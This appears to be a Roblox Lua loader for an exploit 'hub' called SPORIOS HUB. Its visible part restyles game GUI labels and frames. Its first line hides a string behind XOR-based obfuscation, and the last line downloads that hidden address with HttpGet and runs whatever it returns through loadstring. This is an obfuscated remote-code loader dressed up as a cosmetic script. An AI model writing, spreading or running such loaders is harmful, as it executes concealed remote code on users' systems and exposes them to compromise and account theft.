
--[[ STAGE 2: VISUAL CORE ]]
local tzB2XIzEwtMum46Ze8AzJl="\046\071\076\085\089\149\135\140\108\100\115\159\109\112\136\121\147\137\157\164\151\173\163\156\160\191\181\175\206\249\203\196\203\014\210\216\220\240\233\246\243\004\250\028\014\074\026\047\031\042\039\064\059\051\056\124\067\084\081\079\149\058\092\084\101\109\121\149\135\157\119\122\172\160\154\174\149\144\174\187\191\189\201\225\215\194\197\222\227\230\219\075\229\246\255\030\036\026\029\008\117\126\130\053\134\063\152\149\132\075\105\098"local RSrteFDwqngz6GOr=78 local LatE4AdpPNyR=235 local eaNDcu4n1CSs61xtFi_=0 local ClFPLiGlWJGvbzhSDF0=5 local _YKYVnO6eiTJXuUvkePQNh=24 local pSms7R2lk637TxG05_eN=false local DPDFyHRimTnvb5F=bit32 and bit32.bxor if not DPDFyHRimTnvb5F then DPDFyHRimTnvb5F=function(a,b)local r,m=0,1 while a>0 or b>0 do local aa=a%2 local bb=b%2 if aa~=bb then r=r+m end a=(a-aa)/2 b=(b-bb)/2 m=m*2 end return r end end local Wig9KS7bWgOnI={}for aK0azyMp5T0ES6OQP6=1,#tzB2XIzEwtMum46Ze8AzJl do local e1ayW2YhbFIEtm11I=string.byte(tzB2XIzEwtMum46Ze8AzJl,aK0azyMp5T0ES6OQP6)local TFdB3PgASqgg0=(LatE4AdpPNyR+(aK0azyMp5T0ES6OQP6*ClFPLiGlWJGvbzhSDF0)+_YKYVnO6eiTJXuUvkePQNh)%256 if eaNDcu4n1CSs61xtFi_==0 then e1ayW2YhbFIEtm11I=(e1ayW2YhbFIEtm11I-TFdB3PgASqgg0)%256 Wig9KS7bWgOnI[aK0azyMp5T0ES6OQP6]=string.char(DPDFyHRimTnvb5F(e1ayW2YhbFIEtm11I,RSrteFDwqngz6GOr))else e1ayW2YhbFIEtm11I=DPDFyHRimTnvb5F(e1ayW2YhbFIEtm11I,RSrteFDwqngz6GOr)Wig9KS7bWgOnI[aK0azyMp5T0ES6OQP6]=string.char((e1ayW2YhbFIEtm11I-TFdB3PgASqgg0)%256)end end local XJ52cSsOwZYUL=table.concat(Wig9KS7bWgOnI)if pSms7R2lk637TxG05_eN then XJ52cSsOwZYUL=string.reverse(XJ52cSsOwZYUL)end local SGChd3sZLyOKu0wlSXVX=XJ52cSsOwZYUL
local HubName = "SPORIOS HUB"
local Acc = Color3.fromRGB(0, 255, 120)

-- // SMART HOOK //
local function Hook()
    local function Customize(obj)
        pcall(function()
            if obj:IsA("TextLabel") then
                if obj.TextSize >= 18 or obj.Name:find("Title") or obj.Name:find("Header") then
                    if #obj.Text > 3 and not tonumber(obj.Text) then
                        obj.Text = HubName
                        obj.TextColor3 = Acc
                    end
                end
            end
            if obj:IsA("Frame") or obj:IsA("TextButton") then
                if obj.BackgroundColor3.R < 0.2 then
                    if not obj:FindFirstChild("UICorner") then
                        local uic = Instance.new("UICorner")
                        uic.CornerRadius = UDim.new(0, 6)
                        uic.Parent = obj
                    end
                end
            end
        end)
    end

    game.DescendantAdded:Connect(function(c)
        if c:IsA("GuiObject") then
            task.delay(0.1, function() Customize(c) end)
        end
    end)
end

Hook()
loadstring(game:HttpGet(SGChd3sZLyOKu0wlSXVX))()
